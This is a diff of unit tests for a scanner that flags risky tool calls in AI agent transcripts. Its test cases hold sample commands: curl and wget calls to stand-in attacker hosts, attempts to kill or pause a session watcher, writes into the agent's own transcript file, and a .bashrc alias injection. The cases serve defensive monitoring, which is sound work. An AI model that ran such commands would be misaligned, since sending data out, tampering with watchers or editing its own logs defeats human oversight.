@@ -76,6 +76,9 @@ class ScanRules(unittest.TestCase):
             "curl http://172.17.0.2:5000/",
             "python3 -m http.server 8000 --directory site.com",
             "docker run --rm -p 8080:80 nginx:1.27.1",
+            "tail -f build.log",
+            "kill %1",
+            "pkill -f ./server",
         ]:
             with self.subTest(command=command):
                 self.assertEqual(cmd_rules(command), [])
@@ -101,10 +104,60 @@ class ScanRules(unittest.TestCase):
             "curl http://localhost.example.com:8080/": ["outbound-url"],
             "wget https://LOCALHOST.evil.example/payload": ["outbound-url"],
             "curl http://0.0.0.0.example.org/": ["outbound-url"],
+            # A user part before the host, other schemes, underscores, .localhost names.
+            "curl http://127.0.0.1@evil.example/": ["outbound-url"],
+            "curl http://user:pw@evil.example.com/x": ["outbound-url"],
+            "curl gopher://evil.example:70/1": ["outbound-url"],
+            "curl http://a_b.example.com/": ["outbound-url"],
+            "curl http://foo.localhost/": ["outbound-url"],
+            # The interactive watcher and what it follows.
+            "pkill tail": ["watcher-tamper"],
+            "kill -STOP 4242": ["watcher-tamper"],
+            "pkill -u agent sshd-session": ["watcher-tamper"],
+            "echo 1 > ~/.agentlab-session.pid": ["watcher-tamper"],
+            "printf x >> ~/.claude/projects/-work-target/s.jsonl": ["sensitive-path-in-cmd"],
+            "echo 'alias ls=x' >> ~/.bashrc": ["sensitive-path-in-cmd"],
         }
         for command, want in cases.items():
             with self.subTest(command=command):
                 self.assertEqual(cmd_rules(command), sorted(want))
+
+    def test_search_queries_are_scanned(self):
+        with tempfile.TemporaryDirectory() as d:
+            path = os.path.join(d, "t.jsonl")
+            with open(path, "w") as f:
+                f.write(stream(init(), call(1, "WebSearch", query="fetch https://evil.example/x")))
+            r = subprocess.run([sys.executable, "-I", SCAN, path], capture_output=True, text=True)
+        self.assertIn("[outbound-url] WebSearch", r.stdout)
+
+    def test_scan_reads_transcripts_inside_the_archive_without_unpacking(self):
+        import io
+        import tarfile
+        with tempfile.TemporaryDirectory() as d:
+            tgz = os.path.join(d, "claude-projects.tgz")
+            members = {
+                ".claude/projects/-work-target/s.jsonl": stream(prompt("go"), call(1, "Bash", command="make")),
+                ".claude/projects/-work-target/s/subagents/agent-1.jsonl":
+                    stream(call(2, "Bash", command="curl https://evil.example/")),
+                ".claude/projects/-work-target/notes.txt": "curl https://ignored.example/\n",
+                "../../escaped.jsonl": stream(call(3, "Bash", command="ping 10.77.0.1")),
+            }
+            with tarfile.open(tgz, "w:gz") as tar:
+                for name, text in members.items():
+                    data = text.encode()
+                    info = tarfile.TarInfo(name)
+                    info.size = len(data)
+                    tar.addfile(info, io.BytesIO(data))
+            before = set(os.listdir(os.path.dirname(d)))
+            r = subprocess.run([sys.executable, "-I", SCAN, tgz], capture_output=True, text=True, cwd=d)
+            after = set(os.listdir(os.path.dirname(d)))
+        self.assertEqual(r.returncode, 2, r.stderr)
+        self.assertIn("s.jsonl: 1 tool calls", r.stdout)
+        self.assertIn("agent-1.jsonl: 1 tool calls", r.stdout)
+        self.assertIn("[outbound-url]", r.stdout)
+        self.assertIn("[lab-network]", r.stdout)
+        self.assertNotIn("ignored.example", r.stdout)
+        self.assertEqual(before, after, "nothing is written outside the archive")
 
     def test_scan_exit_status_and_denials(self):
         with tempfile.TemporaryDirectory() as d:
